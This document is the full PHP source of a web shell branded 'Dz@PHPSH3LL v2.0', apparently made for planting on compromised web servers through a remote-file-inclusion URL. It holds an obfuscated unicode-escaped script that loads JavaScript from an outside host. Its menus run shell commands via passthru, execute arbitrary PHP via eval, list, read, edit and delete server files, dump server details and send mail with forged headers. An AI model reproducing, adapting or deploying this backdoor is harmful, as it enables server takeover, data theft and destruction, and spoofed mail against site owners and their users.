<www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php>
<body bgcolor="black"><font color="white">
<script type="text/javascript">document.write('\u003c\u0053\u0043\u0052\u0049\u0050\u0054\u0020\u0053\u0052\u0043\u003d\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0077\u0077\u0077\u002e\u0072\u0035\u0037\u002e\u006c\u0069\u002f\u0069\u006d\u0061\u0067\u0065\u0073\u002f\u0069\u006d\u0067\u002e\u006a\u0073\u003e\u003c\u002f\u0053\u0043\u0052\u0049\u0050\u0054\u003e')</script>
<? 
print("<html><head><title>Dz@PHPSH3LL v2.0 | By Aghilas</title></head><body
bgcolor=\"white\" LINK=\"blue\" VLINK=\"blue\">");
print("<p align=\"center\"><font size='4'><font color='red'>#~Dz@PHPSh3LL v2.0 </font></p>");
print("<p>N!ce Small F**king Tool :)<br><br>
<u><font color='white' size='3'><font color='lime'>Enjoy</u><b> (y)</b></font> </p>");

/******fuq iff*****/

/***** WARNING! - I am not responsible for any use made with this script.****/


$QS = $QUERY_STRING;
if(!stristr($QS, "dz") && $QS!="") $QS .= "&dz";
if(!stristr($QS, "dz") && $QS=="") $QS .= "dz";

/*pour les forms*********************************/
$tab = explode("&", $QS);
$i=0;
$remf = "";
while( $tab[$i] != "" && $tab[$i-1] != "dz" )
{
    $temp = str_replace(strchr($tab[$i], "="), "", $tab[$i]);
    eval("\$temp2=\${$temp};");
    $remf .= "<input type=hidden name=" . $temp . " value=" . "'" . $temp2
."'>\n";
    $i++;
}
/*
$temp = str_replace(strchr($tab[$i], "="), "", $tab[$i]);
if($temp!="")
{
    eval("\$temp2=\${$temp};");
    $remf .= "<input type=hidden name=" . $temp . " value=" . "'" . $temp2
."'>\n";
}*/
/************************************************/


/*pour les links*********************************/
if($QS != "dz")
    $reml = "?" . str_replace(strchr($QS, "&dz"), "", $QS) .
"&dz";
else $reml = "?$QS";
$adresse_locale = $reml;
/************************************************/




print("<hr>");
print("<a href=\"$adresse_locale&option=1\"><font color='red'>Run c0mmaNd Shell</font></a><br> <!-- utiliser exec($commande, $retour); -->");
print("<a href=\"$adresse_locale&option=2\"><font color='green'>EVAL PHP Code </font></a><br>");
print("<a href=\"$adresse_locale&option=3\"><font color='white'>Open Dire</font></a><br>");
print("<a href=\"$adresse_locale&option=4\"><font color='red'>General File Options</font></a><br>");
print("<a href=\"$adresse_locale&option=mail\"></a>");
print("<a href=\"$adresse_locale&option=6\"><font color='green'>S0me !Nf0s Of Server</font></a><br>");
print("<br>");
print("<a href=\"$adresse_locale&option=7\"><font color='white'>About ?</font></a><br><hr>");


/* récupération des variables : la fonction $_REQUEST n'existant pas avant php 4.1.0, vous devrez alors commenter ces lignes */
$option = $_REQUEST["option"];
$rep =  $_REQUEST["rep"];
$nom =  $_REQUEST["nom"];
$option_file =  $_REQUEST["option_file"];
$cmd =  $_REQUEST["cmd"];
$code =  $_REQUEST["code"];
$msg =  $_REQUEST["msg"];
$option_mail =  $_REQUEST["option_mail"];
$destinataire =  $_REQUEST["destinataire"];
$sujet =  $_REQUEST["sujet"];
$message =  $_REQUEST["message"];

if($option == 7){
    
    echo "<b><font color='lime'>##################################################<br># H0lly Sh!t :D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br><b># Author &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: &nbsp;&nbsp;Aghilas&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# 
<br># Start Writnig :&nbsp;&nbsp;26/11/2012&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br># Fucked 0n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: &nbsp;&nbsp;15/12/2012&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
</font><font color='red'>
<br>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br><font color='red'># Home &nbsp;&nbsp;: <font size='2' color='red'>Http://L33t-Sec.CoM/ 
</font>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br># c0nt4ct : dzphp@hotmail.com&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br># &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br><font color='white'># From : Algeria&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#<br>
# Root@Dz : Algerian Security_Hacking & Programming #
<br>#&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#
<br>#################################################
<br><br></font></b><font color='orange'>Gr33tz : <font color='gray'>EliteTrOjan | EviL-Dz | JiGSaW | Damane | Gel-Dz | 
<br>Th3 K!LL3R Dz | Hiden Pain | Tr0oN | Hacker-Fire | Br!scO-Dz | <br>1337day | 
LaCr!z_Dz | Erreur404 | TiGER-M@T.....<blink><font color='pink'> And ALL Friends</font></blink><br><br><font color='blue'>(c) 2012 By Aghilas  ------------  WARNING! - I am not responsible for any use made with this script.";
}


if($option == 1){
    print("<form action=\"?\"> $remf <b><font color='red'>Commande : </font></B>  <input type=\"text\" name=\"cmd\"></form>");
    echo "<br> <font color='gray'>N0t3 </font>: <b>si tu est dans un server win0ws utilise les commandes de windows .../enjoy :D";
}

if($option == 2){
    print("<form action=\"?\"> $remf <font color='green'><b>Code : </b></font><input type=\"text\" name=\"code\"></form>");
   echo "<br> <font color='gray'>Exapmle : </font><b> print (''aghilas algerian fucker xD''); <font color='red'>....... </font> ";
}

if($option == 3){
    print("<form action=\"?\"> $remf <b>Dire Name : </b><input type=\"text\" name=\"rep\"></form>");
    print("$rep");
}

if($option == 4){
    print("<form action=\"?\"> $remf");
    print("<font color='red'><b>Name Of File : </b></font> <input type=text name=\"nom\">");
    print("<input type=hidden name=option value=$option>");
    print("<br>");
    print("<br>");
    print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"mkdir\" >Creat File");
    print("<br>");
    print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"edit\" >Editer File");
        print("<br>");
    
print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"del\" >Delet File");
    print("<br>");
    print("<INPUT TYPE=RADIO NAME=\"option_file\" VALUE=\"read\" CHECKED>Read File");
    print("<br>");
    print("<input type=submit value=Run>");
    print("</form>");
}


if($option == 5){
    print("<PRE><form action=\"?\"> $remf Destinataire : <input type=\"text\" name=\"destinataire\" size=\"80\">");
    print("<br>zabi : <input type=\"text\" name=\"provenance\" size=\"80\"><br>");
    print("this option : <input type=\"text\" name=\"retour\" size=\"80\"><br>");
    print("r3m0v3d by the d3vl0p3r : <input type=\"text\" name=\"sujet\" size=\"80\"><br>");
    print("s0rry : <input type=\"text\" name=\"message\"
size=\"80\"><br><input type=\"submit\" value=\"Envoyer\"></form></PRE>");
}

if($option == 6){
    echo"Name of Serv3r : <a href=\"http://$SERVER_NAME\">$SERVER_NAME</a><br>
";
    echo"IP Adresse Serveur : <a href=\"http://$SERVER_ADDR\">$SERVER_ADDR</a><br> ";
    echo"Port : <font color=\"red\">$SERVER_PORT</font><br> ";
    echo"Mail de l' admin fr0m ''SERVER_ADMIN'' : <a href=\"mailto:$SERVER_ADMIN\">$SERVER_ADMIN</a><br><br>";
    
    
    echo"D0c Root du serveur : <font color=\"red\">$DOCUMENT_ROOT</font><br>";

    echo"Path 0n server : <font color=\"red\">$PATH</font> <br>";
    echo"OS, SERVER, PHP version : <font color=\"red\">$SERVER_SOFTWARE</font><br><br>";
    echo"Uname -a : <font color=\"red\">$SERVER_NAM</font><br>";
    echo"Server s0ft : <font color=\"red\">$SERVER_SOFTWARE</font><br>";


    echo"Version 0f CGI : <font color=\"red\">$GATEWAY_INTERFACE</font><br> ";
    echo"Name 0f script : <font color=\"red\">$SCRIPT_NAME</font><br> ";

    echo"Full Adresse 0f script : <font color=\"red\">$REQUEST_URI
</font><br>";
}

/* Commande*******/
if($cmd != "")
{
    echo "{${passthru($cmd)}}<br>";
}
/* Commande*******/


/* Exécution de code PHP**********/
if($code != ""){
    $code = stripslashes($code);
    eval($code);
}
/* Execution de code PHP**********/


/* Listing de rep******************/
if($rep != "")
{
    if(strrchr($rep, "/") != "" ||  !stristr($rep, "/")) $rep .= "/";
    $dir=opendir($rep);
    while ($file = readdir($dir)) 
    {
    	    if (is_dir("$rep/$file") && $file!='.')
	    { 
    		    echo"<li><a href=\"$adresse_locale&rep=$rep$file\"><font color='gray'>(dir)</font><font color='lightgray'> $file</font>
</a><br>\n";
	    }elseif(is_file("$rep/$file"))
	    {
	    	    echo "<li>	<a
href=\"$adresse_locale&option_file=read&nom=$rep$file\"><font color='orange'>(file)</font><font color='lightblue'> $file</font></a> <a
href=\"$adresse_locale&option_file=del&nom=$rep$file\">del</b></a> <a
href=\"$adresse_locale&option_file=edit&nom=$rep$file\">edit</a><br>\n";
	    }
    }
}
/* Listing de rep******************/


/* Gestion des fichiers*********************/
if($option_file == "mkdir" && $nom != "")
{
    $fp = fopen($nom, "w");
    fwrite($fp, stripslashes($msg));
    print("Fichier crée ou modifié avic success khkhkh");
}

if($option_file == "read" && $nom != "")
{
    $fp = fopen($nom, "r");
    $file = fread($fp, filesize($nom));
    $file = htmlentities ($file, ENT_QUOTES);
    $file = nl2br($file);
    echo "<br>$file";
}

if($option_file == "del" && $nom != "")
{
    unlink($nom);
    print("Le Fichier a été bien <b><blink><font color='red'>niké</font></blink></b> // 404 n0t found xD khkhkh");
}

if($option_file == "edit" && $nom != "")
{
    $fp = fopen($nom, "r");
    $file = fread($fp, filesize($nom));
    $file = htmlentities ($file, ENT_QUOTES);
    echo "<form action=$adresse_locale> $remf";
    echo "<TEXTAREA COLS=80 rows=25 name=msg>$file</textarea>";
    echo "<input type=hidden name=option_file value=mkdir>";
    echo "<input type=hidden name=nom value=$nom>";
    echo "<br><input type=submit value=Edite> <b><font color='gray'>n0t3 :</font> </b>les fichiers trop longs ne passent po :(";
    echo "</form>";
}
/* Gestion des fichiers*********************/


/* Envoi de mails************************/
if(($destinataire != "" ) && ($sujet != "") && ($message != "")){
    $option_mail = "From: $provenance \n";
    $option_mail .= "Reply-to: $retour \n";
    $option_mail .= "X-Mailer: Mailer by rAidEn \n";
    
    mail($destinataire, $sujet, $message, $option_mail);
    
    print("Mail envoyé a : $destinataire ...");
}
/* Envoi de mails************************/

print("</body></html>");
/*print("<noscript><script=\"");*/
?>